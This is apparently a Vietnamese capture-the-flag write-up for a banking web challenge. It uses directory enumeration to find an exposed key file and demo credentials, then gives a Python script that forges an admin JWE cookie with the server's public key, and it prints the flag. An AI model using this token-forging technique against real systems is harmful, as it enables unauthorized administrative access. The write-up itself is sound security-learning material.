# Break the Bank

## Overview

Đề bài cho một website ngân hàng. Mục tiêu là khai thác lỗ hổng của hệ thống để truy cập trái phép vào khu vực quản trị và lấy flag.

## Dirsearch

Bước đầu tiên là enumerate path của web.

```bash
dirsearch -u http://challenge.utctf.live:5926/
```

Kết quả đáng chú ý nhất là thấy được path:

```text
/resources
```

Sau khi thấy `/resources`, truy cập trực tiếp trên browser:

Trang này trả về directory listing, hiển thị các file bên trong thư mục:

- `memo.txt`
- `key.pem`
- `FNSB_InternetBanking_Guide.pdf`

## Mở PDF để lấy credential test

Từ file:

```text
/resources/FNSB_InternetBanking_Guide.pdf
```

có thể đọc được demo login credentials:

- Username: `testuser`
- Password: `testpass123`

Đây là bước giúp có được một phiên đăng nhập hợp lệ trên hệ thống.

Sau khi đăng nhập, server cấp cho người dùng một cookie tên là:

```text
fnsb_token
```

## Phân tích `fnsb_token`

Khi giải mã token này từ base64, nhận thấy nó không phải JWT ký số thông thường, mà là một JWE (JSON Web Encryption).

Header của token có dạng:

```json
{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}
```

## File `key.pem`

Quay lại `/resources/` và mở file `key.pem`

Nội dung đầu file cho thấy đây là:

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----
```

## Script để forge token admin

```python
from jwcrypto import jwk, jwe
import json

with open("key.pem", "rb") as f:
    pem = f.read()

key = jwk.JWK.from_pem(pem)

payload = json.dumps({"sub": "admin"}).encode()

token = jwe.JWE(
    plaintext=payload,
    protected={
        "alg": "RSA-OAEP-256",
        "enc": "A256GCM",
        "cty": "JWT"
    }
)

token.add_recipient(key)
print(token.serialize(compact=True))
```

Chạy script sẽ in ra forged token.

## Vào admin và lấy flag

Thay token mới vừa forged được, sau khi token được server chấp nhận, trang admin hiện ra.

![alt text](image.png)

## Flag

```text
utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}
```
